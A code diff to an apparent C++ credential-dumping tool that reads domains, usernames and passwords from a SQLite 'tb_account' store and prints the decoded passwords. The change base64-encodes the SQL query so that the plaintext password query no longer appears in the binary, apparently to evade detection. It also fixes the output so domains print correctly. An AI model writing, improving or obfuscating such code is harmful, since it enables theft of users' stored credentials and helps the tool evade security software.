@@ -163,9 +163,16 @@ private:
 	
 	int _m_select_tbaccount(){
 
-		if (!(sqlite3_exec(sqlite3_obj, (const char*)"select domain, username, password from tb_account;", _callback, NULL, NULL) == SQLITE_OK)){
+		
+		if (!(sqlite3_exec(sqlite3_obj, base64_decode("c2VsZWN0IGRvbWFpbiwgdXNlcm5hbWUsIHBhc3N3b3JkIGZyb20gdGJfYWNjb3VudDs=", base64_chars).c_str(), _callback, NULL, NULL) == SQLITE_OK)){
 			return -1;
 		}
+
+		// select domain, username, password from tb_account;
+		/*
+		if (!(sqlite3_exec(sqlite3_obj, (const char*)"select domain, username, password from tb_account;", _callback, NULL, NULL) == SQLITE_OK)){
+			return -1;
+		}*/
 
 		// cout << "select * from tb_account" << endl;
 
@@ -201,7 +208,7 @@ private:
 
 	int _m_show_decrypt_records(){
 		for (int i=0; i < g_v_sqlresult.size(); i++){
-			cout << "[*] " << "domain: " << g_v_sqlresult[i].m_account << " " << "account: " << g_v_sqlresult[i].m_account << " " << "password: " << g_v_sqlresult[i].m_decode_password << endl;
+			cout << "[*] " << "domain: " << g_v_sqlresult[i].m_domain << " " << "account: " << g_v_sqlresult[i].m_account << " " << "password: " << g_v_sqlresult[i].m_decode_password << endl;
  		}
 		return 0;
 	}
